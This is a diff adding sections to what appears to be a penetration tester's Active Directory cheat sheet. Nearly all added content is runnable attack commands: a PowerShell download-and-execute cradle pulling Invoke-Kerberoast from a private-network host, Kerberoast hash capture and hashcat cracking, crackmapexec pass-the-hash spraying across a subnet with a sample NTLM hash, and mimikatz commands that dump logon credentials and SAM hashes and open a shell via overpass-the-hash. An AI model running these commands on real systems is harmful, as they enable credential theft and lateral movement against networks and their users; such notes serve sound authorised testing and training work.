@@ -100,6 +100,7 @@ powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object System.Net.Webclient).Dow
 ### Powerview Reference
 
 https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
+
 https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview
 
 ### Active Directory Reference
@@ -111,4 +112,32 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20an
 InvokeKerberoast powershell script will request a service ticket from the DC for the service accounts which you can then copy and crack
 
 ```
+IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.101.24/Invoke-Kerberoast.ps1')
+Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File -filepath 'c:\users\public\HashCapture.txt' -Width 8000
+hashcat -m 13100 -o cracked.txt -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --force --potfile-disable
+```
+
+## Password Spraying using crackmapexec
+
+```
+crackmapexec smb 192.168.101.0/24 --local-auth -u Administrator -H a0989207854b684f07b5b6fe68169a35
+crackmapexec smb 192.168.101.0/24 -u vixx -H 'aad3b435b51404eeaa35b51404ee:a0989207854b684f07b5b6fe68169a35'
+```
+
+## OverPass the hash using mimikatz commands
+
+Dump hash and open a cmd shell as vixx using mimikatz(over pass the hash)
+
+```
+privilege::debug
+sekurlsa::logonpasswords
+sekurlsa::pth /user:vixx /domain:vixx.domain /ntlm:a0989207854b684f07b5b6fe68169a35 /run:PowerShell.exe
+```
+
+## Dump Local users NTLM hashes using mimikatz
+
+```
+privilege::debug
+token::elevate
+lsadump::sam
 ```
